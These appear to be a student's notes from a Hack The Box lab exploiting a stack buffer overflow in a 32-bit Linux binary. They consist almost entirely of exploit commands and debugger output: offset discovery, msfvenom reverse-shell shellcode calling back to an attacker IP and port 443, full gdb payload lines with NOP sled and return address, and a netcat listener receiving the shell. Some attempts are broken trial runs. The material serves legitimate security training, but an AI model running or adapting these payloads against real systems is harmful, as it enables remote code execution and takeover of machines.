
```
run $(python -c 'print "\x55" * (2060 - 256 - 95) + "\x90" * 256 + "\xd9\xc3\xba\xaa\xca\x9c\x9b\xd9\x74\x24\xf4\x58\x2b\xc9\xb1\x12\x83\xc0\x04\x31\x50\x13\x03\xfa\xd9\x7e\x6e\xcb\x06\x89\x72\x78\xfa\x25\x1f\x7c\x75\x28\x6f\xe6\x48\x2b\x03\xbf\xe2\x13\xe9\xbf\x4a\x15\x08\xd7\x46\xef\xe4\xd2\x3f\xed\xf8\x1d\x7b\x78\x19\xad\x1d\x2b\x8b\x9e\x52\xc8\xa2\xc1\x58\x4f\xe6\x69\x0d\x7f\x74\x01\xb9\x50\x55\xb3\x50\x26\x4a\x61\xf0\xb1\x6c\x35\xfd\x0c\xee" + "\x31\xd7\xff\xff"')

run $(python -c 'print "\x55" * (2060 - 256 - 95) + "\x90" * 256 + "\xd9\xc3\xba\xaa\xca\x9c\x9b\xd9\x74\x24\xf4\x58\x2b\xc9\xb1\x12\x83\xc0\x04\x31\x50\x13\x03\xfa\xd9\x7e\x6e\xcb\x06\x89\x72\x78\xfa\x25\x1f\x7c\x75\x28\x6f\xe6\x48\x2b\x03\xbf\xe2\x13\xe9\xbf\x4a\x15\x08\xd7\x46\xef\xe4\xd2\x3f\xed\xf8\x1d\x7b\x78\x19\xad\x1d\x2b\x8b\x9e\x52\xc8\xa2\xc1\x58\x4f\xe6\x69\x0d\x7f\x74\x01\xb9\x50\x55\xb3\x50\x26\x4a\x61\xf0\xb1\x6c\x35\xfd\x0c\xee" + "\x66" * 4')
```
## Full Example

to continue:

```sh
┌──(kali㉿kali)-[/usr/share/metasploit-framework/tools/exploit]
└─$ /usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 2500 
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9Au0Au1Au2Au3Au4Au5Au6Au7Au8Au9Av0Av1Av2Av3Av4Av5Av6Av7Av8Av9Aw0Aw1Aw2Aw3Aw4Aw5Aw6Aw7Aw8Aw9Ax0Ax1Ax2Ax3Ax4Ax5Ax6Ax7Ax8Ax9Ay0Ay1Ay2Ay3Ay4Ay5Ay6Ay7Ay8Ay9Az0Az1Az2Az3Az4Az5Az6Az7Az8Az9Ba0Ba1Ba2Ba3Ba4Ba5Ba6Ba7Ba8Ba9Bb0Bb1Bb2Bb3Bb4Bb5Bb6Bb7Bb8Bb9Bc0Bc1Bc2Bc3Bc4Bc5Bc6Bc7Bc8Bc9Bd0Bd1Bd2Bd3Bd4Bd5Bd6Bd7Bd8Bd9Be0Be1Be2Be3Be4Be5Be6Be7Be8Be9Bf0Bf1Bf2Bf3Bf4Bf5Bf6Bf7Bf8Bf9Bg0Bg1Bg2Bg3Bg4Bg5Bg6Bg7Bg8Bg9Bh0Bh1Bh2Bh3Bh4Bh5Bh6Bh7Bh8Bh9Bi0Bi1Bi2Bi3Bi4Bi5Bi6Bi7Bi8Bi9Bj0Bj1Bj2Bj3Bj4Bj5Bj6Bj7Bj8Bj9Bk0Bk1Bk2Bk3Bk4Bk5Bk6Bk7Bk8Bk9Bl0Bl1Bl2Bl3Bl4Bl5Bl6Bl7Bl8Bl9Bm0Bm1Bm2Bm3Bm4Bm5Bm6Bm7Bm8Bm9Bn0Bn1Bn2Bn3Bn4Bn5Bn6Bn7Bn8Bn9Bo0Bo1Bo2Bo3Bo4Bo5Bo6Bo7Bo8Bo9Bp0Bp1Bp2Bp3Bp4Bp5Bp6Bp7Bp8Bp9Bq0Bq1Bq2Bq3Bq4Bq5Bq6Bq7Bq8Bq9Br0Br1Br2Br3Br4Br5Br6Br7Br8Br9Bs0Bs1Bs2Bs3Bs4Bs5Bs6Bs7Bs8Bs9Bt0Bt1Bt2Bt3Bt4Bt5Bt6Bt7Bt8Bt9Bu0Bu1Bu2Bu3Bu4Bu5Bu6Bu7Bu8Bu9Bv0Bv1Bv2Bv3Bv4Bv5Bv6Bv7Bv8Bv9Bw0Bw1Bw2Bw3Bw4Bw5Bw6Bw7Bw8Bw9Bx0Bx1Bx2Bx3Bx4Bx5Bx6Bx7Bx8Bx9By0By1By2By3By4By5By6By7By8By9Bz0Bz1Bz2Bz3Bz4Bz5Bz6Bz7Bz8Bz9Ca0Ca1Ca2Ca3Ca4Ca5Ca6Ca7Ca8Ca9Cb0Cb1Cb2Cb3Cb4Cb5Cb6Cb7Cb8Cb9Cc0Cc1Cc2Cc3Cc4Cc5Cc6Cc7Cc8Cc9Cd0Cd1Cd2Cd3Cd4Cd5Cd6Cd7Cd8Cd9Ce0Ce1Ce2Ce3Ce4Ce5Ce6Ce7Ce8Ce9Cf0Cf1Cf2Cf3Cf4Cf5Cf6Cf7Cf8Cf9Cg0Cg1Cg2Cg3Cg4Cg5Cg6Cg7Cg8Cg9Ch0Ch1Ch2Ch3Ch4Ch5Ch6Ch7Ch8Ch9Ci0Ci1Ci2Ci3Ci4Ci5Ci6Ci7Ci8Ci9Cj0Cj1Cj2Cj3Cj4Cj5Cj6Cj7Cj8Cj9Ck0Ck1Ck2Ck3Ck4Ck5Ck6Ck7Ck8Ck9Cl0Cl1Cl2Cl3Cl4Cl5Cl6Cl7Cl8Cl9Cm0Cm1Cm2Cm3Cm4Cm5Cm6Cm7Cm8Cm9Cn0Cn1Cn2Cn3Cn4Cn5Cn6Cn7Cn8Cn9Co0Co1Co2Co3Co4Co5Co6Co7Co8Co9Cp0Cp1Cp2Cp3Cp4Cp5Cp6Cp7Cp8Cp9Cq0Cq1Cq2Cq3Cq4Cq5Cq6Cq7Cq8Cq9Cr0Cr1Cr2Cr3Cr4Cr5Cr6Cr7Cr8Cr9Cs0Cs1Cs2Cs3Cs4Cs5Cs6Cs7Cs8Cs9Ct0Ct1Ct2Ct3Ct4Ct5Ct6Ct7Ct8Ct9Cu0Cu1Cu2Cu3Cu4Cu5Cu6Cu7Cu8Cu9Cv0Cv1Cv2Cv3Cv4Cv5Cv6Cv7Cv8Cv9Cw0Cw1Cw2Cw3Cw4Cw5Cw6Cw7Cw8Cw9Cx0Cx1Cx2Cx3Cx4Cx5Cx6Cx7Cx8Cx9Cy0Cy1Cy2Cy3Cy4Cy5Cy6Cy7Cy8Cy9Cz0Cz1Cz2Cz3Cz4Cz5Cz6Cz7Cz8Cz9Da0Da1Da2Da3Da4Da5Da6Da7Da8Da9Db0Db1Db2Db3Db4Db5Db6Db7Db8Db9Dc0Dc1Dc2Dc3Dc4Dc5Dc6Dc7Dc8Dc9Dd0Dd1Dd2Dd3Dd4Dd5Dd6Dd7Dd8Dd9De0De1De2De3De4De5De6De7De8De9Df0Df1Df2D
```

```sh
htb-student@nixbof32skills:~$ gdb ./leave_msg

Reading symbols from ./leave_msg...(no debugging symbols found)...done.
(gdb) run Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9Au0Au1Au2Au3Au4Au5Au6Au7Au8Au9Av0Av1Av2Av3Av4Av5Av6Av7Av8Av9Aw0Aw1Aw2Aw3Aw4Aw5Aw6Aw7Aw8Aw9Ax0Ax1Ax2Ax3Ax4Ax5Ax6Ax7Ax8Ax9Ay0Ay1Ay2Ay3Ay4Ay5Ay6Ay7Ay8Ay9Az0Az1Az2Az3Az4Az5Az6Az7Az8Az9Ba0Ba1Ba2Ba3Ba4Ba5Ba6Ba7Ba8Ba9Bb0Bb1Bb2Bb3Bb4Bb5Bb6Bb7Bb8Bb9Bc0Bc1Bc2Bc3Bc4Bc5Bc6Bc7Bc8Bc9Bd0Bd1Bd2Bd3Bd4Bd5Bd6Bd7Bd8Bd9Be0Be1Be2Be3Be4Be5Be6Be7Be8Be9Bf0Bf1Bf2Bf3Bf4Bf5Bf6Bf7Bf8Bf9Bg0Bg1Bg2Bg3Bg4Bg5Bg6Bg7Bg8Bg9Bh0Bh1Bh2Bh3Bh4Bh5Bh6Bh7Bh8Bh9Bi0Bi1Bi2Bi3Bi4Bi5Bi6Bi7Bi8Bi9Bj0Bj1Bj2Bj3Bj4Bj5Bj6Bj7Bj8Bj9Bk0Bk1Bk2Bk3Bk4Bk5Bk6Bk7Bk8Bk9Bl0Bl1Bl2Bl3Bl4Bl5Bl6Bl7Bl8Bl9Bm0Bm1Bm2Bm3Bm4Bm5Bm6Bm7Bm8Bm9Bn0Bn1Bn2Bn3Bn4Bn5Bn6Bn7Bn8Bn9Bo0Bo1Bo2Bo3Bo4Bo5Bo6Bo7Bo8Bo9Bp0Bp1Bp2Bp3Bp4Bp5Bp6Bp7Bp8Bp9Bq0Bq1Bq2Bq3Bq4Bq5Bq6Bq7Bq8Bq9Br0Br1Br2Br3Br4Br5Br6Br7Br8Br9Bs0Bs1Bs2Bs3Bs4Bs5Bs6Bs7Bs8Bs9Bt0Bt1Bt2Bt3Bt4Bt5Bt6Bt7Bt8Bt9Bu0Bu1Bu2Bu3Bu4Bu5Bu6Bu7Bu8Bu9Bv0Bv1Bv2Bv3Bv4Bv5Bv6Bv7Bv8Bv9Bw0Bw1Bw2Bw3Bw4Bw5Bw6Bw7Bw8Bw9Bx0Bx1Bx2Bx3Bx4Bx5Bx6Bx7Bx8Bx9By0By1By2By3By4By5By6By7By8By9Bz0Bz1Bz2Bz3Bz4Bz5Bz6Bz7Bz8Bz9Ca0Ca1Ca2Ca3Ca4Ca5Ca6Ca7Ca8Ca9Cb0Cb1Cb2Cb3Cb4Cb5Cb6Cb7Cb8Cb9Cc0Cc1Cc2Cc3Cc4Cc5Cc6Cc7Cc8Cc9Cd0Cd1Cd2Cd3Cd4Cd5Cd6Cd7Cd8Cd9Ce0Ce1Ce2Ce3Ce4Ce5Ce6Ce7Ce8Ce9Cf0Cf1Cf2Cf3Cf4Cf5Cf6Cf7Cf8Cf9Cg0Cg1Cg2Cg3Cg4Cg5Cg6Cg7Cg8Cg9Ch0Ch1Ch2Ch3Ch4Ch5Ch6Ch7Ch8Ch9Ci0Ci1Ci2Ci3Ci4Ci5Ci6Ci7Ci8Ci9Cj0Cj1Cj2Cj3Cj4Cj5Cj6Cj7Cj8Cj9Ck0Ck1Ck2Ck3Ck4Ck5Ck6Ck7Ck8Ck9Cl0Cl1Cl2Cl3Cl4Cl5Cl6Cl7Cl8Cl9Cm0Cm1Cm2Cm3Cm4Cm5Cm6Cm7Cm8Cm9Cn0Cn1Cn2Cn3Cn4Cn5Cn6Cn7Cn8Cn9Co0Co1Co2Co3Co4Co5Co6Co7Co8Co9Cp0Cp1Cp2Cp3Cp4Cp5Cp6Cp7Cp8Cp9Cq0Cq1Cq2Cq3Cq4Cq5Cq6Cq7Cq8Cq9Cr0Cr1Cr2Cr3Cr4Cr5Cr6Cr7Cr8Cr9Cs0Cs1Cs2Cs3Cs4Cs5Cs6Cs7Cs8Cs9Ct0Ct1Ct2Ct3Ct4Ct5Ct6Ct7Ct8Ct9Cu0Cu1Cu2Cu3Cu4Cu5Cu6Cu7Cu8Cu9Cv0Cv1Cv2Cv3Cv4Cv5Cv6Cv7Cv8Cv9Cw0Cw1Cw2Cw3Cw4Cw5Cw6Cw7Cw8Cw9Cx0Cx1Cx2Cx3Cx4Cx5Cx6Cx7Cx8Cx9Cy0Cy1Cy2Cy3Cy4Cy5Cy6Cy7Cy8Cy9Cz0Cz1Cz2Cz3Cz4Cz5Cz6Cz7Cz8Cz9Da0Da1Da2Da3Da4Da5Da6Da7Da8Da9Db0Db1Db2Db3Db4Db5Db6Db7Db8Db9Dc0Dc1Dc2Dc3Dc4Dc5Dc6Dc7Dc8Dc9Dd0Dd1Dd2Dd3Dd4Dd5Dd6Dd7Dd8Dd9De0De1De2De3De4De5De6De7De8De9Df0Df1Df2D
Starting program: /home/htb-student/leave_msg ...

Program received signal SIGSEGV, Segmentation fault.
0x37714336 in ?? ()

```

```sh
┌──(kali㉿kali)-[/usr/share/metasploit-framework/tools/exploit]
└─$ ./pattern_offset.rb -q 0x37714336
[*] Exact match at offset 2060
```

finding bad chars:
`\x00\x09\x0a\x20`

```sh
┌──(kali㉿kali)-[~]
└─$ msfvenom -p linux/x86/shell_reverse_tcp lhost=10.10.14.245 lport=443 --format c --arch x86 --platform linux --bad-chars "\x00\x09\x0a\x20"                
Found 11 compatible encoders
Attempting to encode payload with 1 iterations of x86/shikata_ga_nai
x86/shikata_ga_nai succeeded with size 95 (iteration=0)
x86/shikata_ga_nai chosen with final size 95
Payload size: 95 bytes
Final size of c file: 425 bytes
unsigned char buf[] = 
"\xd9\xc3\xba\xaa\xca\x9c\x9b\xd9\x74\x24\xf4\x58\x2b\xc9"
"\xb1\x12\x83\xc0\x04\x31\x50\x13\x03\xfa\xd9\x7e\x6e\xcb"
"\x06\x89\x72\x78\xfa\x25\x1f\x7c\x75\x28\x6f\xe6\x48\x2b"
"\x03\xbf\xe2\x13\xe9\xbf\x4a\x15\x08\xd7\x46\xef\xe4\xd2"
"\x3f\xed\xf8\x1d\x7b\x78\x19\xad\x1d\x2b\x8b\x9e\x52\xc8"
"\xa2\xc1\x58\x4f\xe6\x69\x0d\x7f\x74\x01\xb9\x50\x55\xb3"
"\x50\x26\x4a\x61\xf0\xb1\x6c\x35\xfd\x0c\xee";
```

```sh
htb-student@nixbof32skills:~$ gdb ./leave_msg


```

```
0xffffccd8:     0x90    0x90    0x90    0x90    0x90    0x90    0x90    0x90
0xffffcce0:     0x90    0x90    0x90    0x90    0x90    0x90    0x90    0x90
0xffffcce8:     0x90    0x90    0x90    0x90    0x90    0x90    0x90    0x90
0xffffccf0:     0x90    0x90    0x90    0x90    0x90    0x90    0x90    0x90
0xffffccf8:     0x90    0x90    0x90    0x90    0x90    0x90    0x90    0x90
0xffffcd00:     0x90    0x90    0x90    0x90    0x90    0x90    0x90    0x90
0xffffcd08:     0x90    0x90    0x90    0x90    0x90    0xd9    0xc3    0xba
0xffffcd10:     0xaa    0xca    0x9c    0x9b    0xd9    0x74    0x24    0xf4
0xffffcd18:     0x58    0x2b    0xc9    0xb1    0x12    0x83    0xc0    0x04
---Type <return> to continue, or q <return> to quit---q
Quit
(gdb) run $(python -c 'print "\x55" * (2060 - 256 - 95) + "\x90" * 256 + "\xd9\xc3\xba\xaa\xca\x9c\x9b\xd9\x74\x24\xf4\x58\x2b\xc9\xb1\x12\x83\xc0\x04\x31\x50\x13\x03\xfa\xd9\x7e\x6e\xcb\x06\x89\x72\x78\xfa\x25\x1f\x7c\x75\x28\x6f\xe6\x48\x2b\x03\xbf\xe2\x13\xe9\xbf\x4a\x15\x08\xd7\x46\xef\xe4\xd2\x3f\xed\xf8\x1d\x7b\x78\x19\xad\x1d\x2b\x8b\x9e\x52\xc8\xa2\xc1\x58\x4f\xe6\x69\x0d\x7f\x74\x01\xb9\x50\x55\xb3\x50\x26\x4a\x61\xf0\xb1\x6c\x35\xfd\x0c\xee" + "\x90\xcc\xff\xff"')
The program being debugged has been started already.
Start it from the beginning? (y or n) y
Starting program: /home/htb-student/leave_msg $(python -c 'print "\x55" * (2060 - 256 - 95) + "\x90" * 256 + "\xd9\xc3\xba\xaa\xca\x9c\x9b\xd9\x74\x24\xf4\x58\x2b\xc9\xb1\x12\x83\xc0\x04\x31\x50\x13\x03\xfa\xd9\x7e\x6e\xcb\x06\x89\x72\x78\xfa\x25\x1f\x7c\x75\x28\x6f\xe6\x48\x2b\x03\xbf\xe2\x13\xe9\xbf\x4a\x15\x08\xd7\x46\xef\xe4\xd2\x3f\xed\xf8\x1d\x7b\x78\x19\xad\x1d\x2b\x8b\x9e\x52\xc8\xa2\xc1\x58\x4f\xe6\x69\x0d\x7f\x74\x01\xb9\x50\x55\xb3\x50\x26\x4a\x61\xf0\xb1\x6c\x35\xfd\x0c\xee" + "\x90\xcc\xff\xff"')

Program received signal SIGSEGV, Segmentation fault.
0xffffcd58 in ?? ()
(gdb) Quit
(gdb) s
Cannot find bounds of current function
(gdb) run $(python -c 'print "\x55" * (2060 - 256 - 95) + "\x90" * 256 + "\xd9\xc3\xba\xaa\xca\x9c\x9b\xd9\x74\x24\xf4\x58\x2b\xc9\xb1\x12\x83\xc0\x04\x31\x50\x13\x03\xfa\xd9\x7e\x6e\xcb\x06\x89\x72\x78\xfa\x25\x1f\x7c\x75\x28\x6f\xe6\x48\x2b\x03\xbf\xe2\x13\xe9\xbf\x4a\x15\x08\xd7\x46\xef\xe4\xd2\x3f\xed\xf8\x1d\x7b\x78\x19\xad\x1d\x2b\x8b\x9e\x52\xc8\xa2\xc1\x58\x4f\xe6\x69\x0d\x7f\x74\x01\xb9\x50\x55\xb3\x50\x26\x4a\x61\xf0\xb1\x6c\x35\xfd\x0c\xee" + "\x90\xcc\xff\xff"')
The program being debugged has been started already.
Start it from the beginning? (y or n) y
Starting program: /home/htb-student/leave_msg $(python -c 'print "\x55" * (2060 - 256 - 95) + "\x90" * 256 + "\xd9\xc3\xba\xaa\xca\x9c\x9b\xd9\x74\x24\xf4\x58\x2b\xc9\xb1\x12\x83\xc0\x04\x31\x50\x13\x03\xfa\xd9\x7e\x6e\xcb\x06\x89\x72\x78\xfa\x25\x1f\x7c\x75\x28\x6f\xe6\x48\x2b\x03\xbf\xe2\x13\xe9\xbf\x4a\x15\x08\xd7\x46\xef\xe4\xd2\x3f\xed\xf8\x1d\x7b\x78\x19\xad\x1d\x2b\x8b\x9e\x52\xc8\xa2\xc1\x58\x4f\xe6\x69\x0d\x7f\x74\x01\xb9\x50\x55\xb3\x50\x26\x4a\x61\xf0\xb1\x6c\x35\xfd\x0c\xee" + "\x90\xcc\xff\xff"')

Program received signal SIGSEGV, Segmentation fault.
0xffffcd58 in ?? ()
(gdb) run $(python -c 'print "\x55" * (2060 - 256 - 28) + "\x90" * 256 + "\x48\xb9\x2f\x62\x69\x6e\x2f\x73\x68\x11\x48\xc1\xe1\x08\x48\xc1\xe9\x08\x51\x48\x8d\x3c\x24\x48\x31\xd2\xb0\x3" + "\x90\xcc\xff\xff"')
The program being debugged has been started already.
Start it from the beginning? (y or n) y
Starting program: /home/htb-student/leave_msg $(python -c 'print "\x55" * (2060 - 256 - 28) + "\x90" * 256 + "\x48\xb9\x2f\x62\x69\x6e\x2f\x73\x68\x11\x48\xc1\xe1\x08\x48\xc1\xe9\x08\x51\x48\x8d\x3c\x24\x48\x31\xd2\xb0\x3" + "\x90\xcc\xff\xff"')
ValueError: invalid \x escape

Program received signal SIGSEGV, Segmentation fault.
0xf7e729c8 in ?? () from /lib32/libc.so.6
(gdb) run $(python -c 'print "\x55" * (2060 - 256 - 28) + "\x90" * 256 + "\x48\xb9\x2f\x62\x69\x6e\x2f\x73\x68\x11\x48\xc1\xe1\x08\x48\xc1\xe9\x08\x51\x48\x8d\x3c\x24\x48\x31\xd2\xb0\x3" + "\x66\x66\x66\x66"')
The program being debugged has been started already.
Start it from the beginning? (y or n) y
Starting program: /home/htb-student/leave_msg $(python -c 'print "\x55" * (2060 - 256 - 28) + "\x90" * 256 + "\x48\xb9\x2f\x62\x69\x6e\x2f\x73\x68\x11\x48\xc1\xe1\x08\x48\xc1\xe9\x08\x51\x48\x8d\x3c\x24\x48\x31\xd2\xb0\x3" + "\x66\x66\x66\x66"')
ValueError: invalid \x escape

Program received signal SIGSEGV, Segmentation fault.
0xf7e729c8 in ?? () from /lib32/libc.so.6
(gdb) client_loop: send disconnect: Broken pipe
                                                  
```

one more tab with tests deleted


```sh
┌──(kali㉿kali)-[~]
└─$ nc -nvlp 443                
listening on [any] 443 ...
connect to [10.10.14.245] from (UNKNOWN) [10.129.203.18] 33802

ls
pwd
^C

┌──(kali㉿kali)-[~]
└─$ nc -nvlp 443
listening on [any] 443 ...
connect to [10.10.14.245] from (UNKNOWN) [10.129.203.18] 33838
pwd
^C
  
```

---

new try doing it locally instead of trying to connect to my machine:

`msfvenom -p linux/x86/shell_reverse_tcp lhost=127.0.0.1 lport=31337 --format c --arch x86 --platform linux --bad-chars "\x00\x09\x0a\x20"`

```
\xd9\xc9\xb8\xb5\xa8\xcc\x7b\xd9\x74\x24\xf4\x5a\x29\xc9\xb1\x12\x31\x42\x17\x03\x42\x17\x83\x77\xac\x2e\x8e\x46\x76\x59\x92\xfb\xcb\xf5\x3f\xf9\x42\x18\x0f\x9b\x99\x5b\xe3\x3a\x92\x63\xc9\x3c\x9b\xe2\x28\x54\x63\x15\xcb\xa5\xf3\x17\xcb\xdf\x6a\x91\x2a\xaf\x0b\xf1\xfd\x9c\x60\xf2\x74\xc3\x4a\x75\xd4\x6b\x3b\x59\xaa\x03\xab\x8a\x63\xb1\x42\x5c\x98\x67\xc6\xd7\xbe\x37\xe3\x2a\xc0
```

```
run $(python -c 'print "\x55" * (2060 - 256 - 95) + "\x90" * 256 + "\xd9\xc9\xb8\xb5\xa8\xcc\x7b\xd9\x74\x24\xf4\x5a\x29\xc9\xb1\x12\x31\x42\x17\x03\x42\x17\x83\x77\xac\x2e\x8e\x46\x76\x59\x92\xfb\xcb\xf5\x3f\xf9\x42\x18\x0f\x9b\x99\x5b\xe3\x3a\x92\x63\xc9\x3c\x9b\xe2\x28\x54\x63\x15\xcb\xa5\xf3\x17\xcb\xdf\x6a\x91\x2a\xaf\x0b\xf1\xfd\x9c\x60\xf2\x74\xc3\x4a\x75\xd4\x6b\x3b\x59\xaa\x03\xab\x8a\x63\xb1\x42\x5c\x98\x67\xc6\xd7\xbe\x37\xe3\x2a\xc0" + "\xe8\xd6\xff\xff"')

x/2000xb $esp+2200

```
